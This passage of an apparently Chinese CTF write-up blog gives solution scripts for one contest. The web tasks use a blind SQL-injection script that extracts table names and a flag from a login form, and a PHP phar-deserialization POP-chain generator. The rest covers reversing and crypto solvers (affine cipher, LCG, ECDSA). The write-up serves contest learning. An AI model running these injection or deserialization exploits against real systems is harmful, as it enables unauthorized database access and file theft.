class="line"><span class="string">    for j in s:</span></span><br><span class="line"><span class="string">        time.sleep(0.1)</span></span><br><span class="line"><span class="string">        payload = &quot;1&#x27;/**/||/**/!(ascii(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),&#123;&#125;,1))&lt;&gt;ascii(&#x27;&#123;&#125;&#x27;))#&quot;.format(i, j)</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            &#x27;username&#x27;: payload,</span></span><br><span class="line"><span class="string">            &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">        if res.find(&#x27;good&#x27;) != -1:</span></span><br><span class="line"><span class="string">            table += j</span></span><br><span class="line"><span class="string">            print(table)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;1&#x27;/**/||/**/!(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),1,34)&lt;&gt;&#x27;address,email,flag_table_1,users&#x27;)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload2,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload3 = &quot;1&#x27;/**/||/**/(1,1)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload3,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>): </span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="comment"># for j in s:</span></span><br><span class="line">        hexchar = trans(flag+ <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;||/**/if((select/**/(0,&#123;&#125;)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)),1,0)#&quot;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;good&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># flag += j</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><blockquote>
<p>phar反序列化</p>
</blockquote>
<p>先通过任意文件读取获得class file fun class这些php文件，代码审计</p>
<p>构造pop链，生成phar文件</p>
<p>看到已经有其他队伍把这题做出来了，此时先测试看看能不能连上别的队伍上传成功的文件，根据file.php中对文件名的处理，随便测试了几个，发现phar.jpg处理后的文件路径能用，获得flag</p>
<p>下面贴上自己写的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$File</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$docker</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$cloud</span> = <span class="keyword">new</span> Cloud();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cloud</span>-&gt;docker = <span class="string">&#x27;O\:6\:\&quot;Docker\&quot;\:3\:\&#123;s\:3\:\&quot;str\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container1\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container2\&quot;\;s\:4\:\&quot;haha\&quot;\;\&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$File</span>-&gt;file = <span class="variable">$docker</span>;</span><br><span class="line"><span class="variable">$docker</span>-&gt;str = <span class="variable">$cloud</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$File</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>直接拖到ida里，得到flag</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E6%88%AA%E5%9B%BE20211003125756.png"></p>
<h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>拖到ILSpy里，获得逆向代码</p>
<p>简单写个脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppp</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    a %= c</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            num = num * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % c      </span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">array2 = [</span><br><span class="line">            <span class="number">30361</span>,</span><br><span class="line">			<span class="number">550</span>,</span><br><span class="line">			<span class="number">595</span>,</span><br><span class="line">			<span class="number">15412</span>,</span><br><span class="line">			<span class="number">30361</span>,</span><br><span class="line">			<span class="number">15412</span>,</span><br><span class="line">			<span class="number">8346</span>,</span><br><span class="line">			<span class="number">27071</span>,</span><br><span class="line">			<span class="number">37594</span>,</span><br><span class="line">			<span class="number">37534</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">1082</span>,</span><br><span class="line">			<span class="number">19619</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">1082</span>,</span><br><span class="line">			<span class="number">15513</span>,</span><br><span class="line">			<span class="number">29591</span>,</span><br><span class="line">			<span class="number">19596</span>,</span><br><span class="line">			<span class="number">30078</span>,</span><br><span class="line">			<span class="number">27942</span>,</span><br><span class="line">			<span class="number">25366</span>,</span><br><span class="line">			<span class="number">29107</span>,</span><br><span class="line">			<span class="number">7433</span>,</span><br><span class="line">			<span class="number">28493</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">29591</span>,</span><br><span class="line">			<span class="number">2664</span>,</span><br><span class="line">			<span class="number">12540</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array2)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">if</span> array2[j] == ppp(i, <span class="number">377</span>, <span class="number">38009</span>):</span><br><span class="line">            test.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">        print(<span class="built_in">chr</span>(j-i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>跑出flag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><p>简单写个脚本爆破</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = <span class="number">37</span></span><br><span class="line">b = <span class="number">23</span></span><br><span class="line">c = <span class="number">52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def affine(m,a,b,c):</span></span><br><span class="line"><span class="string">    chipher=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(len(m)):</span></span><br><span class="line"><span class="string">        if m[i] in table:</span></span><br><span class="line"><span class="string">            chipher+=table[(a*(table.find(m[i]))+b)%c]</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            chipher+=m[i]</span></span><br><span class="line"><span class="string">    return chipher</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;aoxL&#123;Fw0_TXk_y3xtW_ZP_TCBg7VLCxGwb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">if</span> t[i] <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> table[(a*(table.find(j))+b)%c] == t[i]:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += t[i]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="lcg"><a href="#lcg" class="headerlink" title="lcg"></a>lcg</h3><p>从网上找个个脚本，写的很详细</p>
<p><a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag = &#x27;&#x27;.encode()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seed = bytes_to_long(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">length = seed.bit_length()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n=getPrime(length)</span></span><br><span class="line"><span class="string">a=getPrime(length)</span></span><br><span class="line"><span class="string">b=getPrime(length)</span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    seed = (a*seed+b)%n</span></span><br><span class="line"><span class="string">    s.append(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span> </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s=[<span class="number">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class="number">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class="number">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class="number">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class="number">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class="number">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class="number">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class="number">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class="number">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class="number">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    print(long_to_bytes(plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dear-Alice"><a href="#Dear-Alice" class="headerlink" title="Dear Alice"></a>Dear Alice</h3><p>google ctf 2021原题</p>
<p><a href="https://github.com/Haorical/Wargames/tree/master/google-2021/h1">https://github.com/Haorical/Wargames/tree/master/google-2021/h1</a></p>
<p>嫖到脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INF = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">311315114987715623444276142623839583360207853110657101019745009424926710590583360123029204556690633449715530612380512577293882572730509350735778781050933</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413552439917934304191956942765446530386427345937963894309923928536070534607816947</span></span><br><span class="line">a = <span class="number">6294860557973063227666421306476379324074715770622746227136910445450301914281276098027990968407983962691151853678563877834221834027439718238065725844264138</span></span><br><span class="line">b = <span class="number">3245789008328967059274849584342077916531909009637501918328323668736179176583263496463525128488282611559800773506973771797764811498834995234341530862286627</span></span><br><span class="line">n = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413418528378981730643524959857451398370029280583094215613882043973354392115544169</span></span><br><span class="line">G = (<span class="number">5139617820728399941653175323358137352238277428061991823713659546881441331696699723004749024403291797641521696406798421624364096550661311227399430098134141</span>,</span><br><span class="line">     <span class="number">1798860115416690485862271986832828064808333512613833729548071279524320966991708554765227095605106785724406691559310536469721469398449016850588110200884962</span>,</span><br><span class="line">     <span class="number">5042518522433577951395875294780962682755843408950010956510838422057522452845550974098236475624683438351211176927595173916071040272153903968536756498306512</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Double</span>(<span class="params">p</span>):</span></span><br><span class="line">    x, y, z = p</span><br><span class="line">    <span class="keyword">if</span> z == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> INF</span><br><span class="line">    ysqr = y * y % mod</span><br><span class="line">    zsqr = z * z % mod</span><br><span class="line">    s = <span class="number">4</span> * x * ysqr % mod</span><br><span class="line">    m = (<span class="number">3</span> * x * x + a * zsqr * zsqr) % mod</span><br><span class="line">    x2 = (m * m - <span class="number">2</span> * s) % mod</span><br><span class="line">    y2 = (m * (s - x2) - <span class="number">8</span> * ysqr * ysqr) % mod</span><br><span class="line">    z2 = <span class="number">2</span> * y * z % mod</span><br><span class="line">    <span class="keyword">return</span> x2, y2, z2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, q</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">if</span> q[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    x1, y1, z1 = p</span><br><span class="line">    x2, y2, z2 = q</span><br><span class="line">    z1sqr = z1 * z1 % mod</span><br><span class="line">    z2sqr = z2 * z2 % mod</span><br><span class="line">    u1 = x1 * z2sqr % mod</span><br><span class="line">    u2 = x2 * z1sqr % mod</span><br><span class="line">    s1 = y1 * z2 * z2sqr % mod</span><br><span class="line">    s2 = y2 * z1 * z1sqr % mod</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">if</span> s1 != s2:</span><br><span class="line">            <span class="keyword">return</span> INF</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Double(p)</span><br><span class="line">    h = u2 - u1 % mod</span><br><span class="line">    hsqr = h * h % mod</span><br><span class="line">    hcube = hsqr * h % mod</span><br><span class="line">    r = s2 - s1 % mod</span><br><span class="line">    t = u1 * hsqr % mod</span><br><span class="line">    x3 = (r * r - hcube - <span class="number">2</span> * t) % mod</span><br><span class="line">    y3 = (r * (t - x3) - s1 * hcube) % mod</span><br><span class="line">    z3 = h * z1 * z2 % mod</span><br><span class="line">    <span class="keyword">return</span> x3, y3, z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == INF:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    res = INF</span><br><span class="line">    <span class="keyword">while</span> x:</span><br><span class="line">        x, r = <span class="built_in">divmod</span>(x, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            res = Add(res, p)</span><br><span class="line">        p = Double(p)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Transform</span>(<span class="params">m, l</span>):</span></span><br><span class="line">    z = m</span><br><span class="line">    shift = l - n.bit_length()</span><br><span class="line">    <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">        z &gt;&gt;= shift</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RNG</span>(<span class="params">nbits, a, b</span>):</span></span><br><span class="line">    nbytes = nbits // <span class="number">8</span></span><br><span class="line">    B = os.urandom(nbytes)</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">sum</span>([B[i] * b ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(B))]) % <span class="number">2</span>**nbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sign</span>(<span class="params">msg, d</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">&#x27;d = &#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;z = &#x27;</span>, z)</span><br><span class="line">    k = RNG(n.bit_length(), <span class="number">16843009</span>, <span class="number">4294967296</span>)</span><br><span class="line">    print(<span class="string">&#x27;k = &#x27;</span>, k)</span><br><span class="line">    x1, y1, z1 = Multiply(G, k)</span><br><span class="line">    r = (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line">    s = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    print(<span class="string">&#x27;r = &#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s = &#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;left = &#x27;</span>, <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) % n)</span><br><span class="line">    print(<span class="string">&#x27;right = &#x27;</span>, (z + r * d) % n)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(s) == <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Verify</span>(<span class="params">msg, Q, r, s</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    u1 = z*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    u2 = r*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    x1, y1, z1 = Add(Multiply(G, u1), Multiply(Q, u2))</span><br><span class="line">    <span class="keyword">return</span> r == (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    encryptor = Cipher(aes, modes.ECB(), default_backend()).encryptor()</span><br><span class="line">    padder = padding.PKCS7(aes.block_size).padder()</span><br><span class="line">    padded_data = padder.update(plaintext) + padder.finalize()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    decryptor = Cipher(aes, modes.ECB(), default_backend()).decryptor()</span><br><span class="line">    unpadder = padding.PKCS7(aes.block_size).unpadder()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    plaintext = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">_, _, ca = (<span class="number">8832295267397231051293216564016639537146222596144354850230682204978731311879255662259663270183445827348338041752369314181111940713714991119349376636404112</span>, <span class="number">8683784208731634307361157916911868656279723101808163939313971801256736484458199874570532609285522391139002296248059424750941962344918156540408403221858292</span>, <span class="number">105398535464409171419472607677747462033030589690350997911381059472020486557672504778060748058626707326992258591478040500759349352824508941100030623708235493999018571171774658661651532338275358740821547158517615704187173346885098836066743736788259192831313414309775979590033581301910426314601982482556670097620</span>)</span><br><span class="line"></span><br><span class="line">ka = [</span><br><span class="line">    <span class="number">0x8a6e81a10c229af504772b51c502638820811034faa62b8dafa019210347918419b71d0638c89b59026b7611edc6a14b2c1c1fb1092a352adfffb7e114f4f385</span>,</span><br><span class="line">    <span class="number">0x3f837315a1fb46097f5eb680697901d75758b859846d37cad33d3f464efb84ace1e85fc60f4e445a031b5ca0e4965e0b081bd4a6e8efea1d3ba07aad51a70cd</span></span><br><span class="line">]</span><br><span class="line">ca = ca.to_bytes(byteorder=<span class="string">&#x27;big&#x27;</span>,length=(ca.bit_length() + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ka:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recv_msg = Decrypt(ca, k)</span><br><span class="line">        print(recv_msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

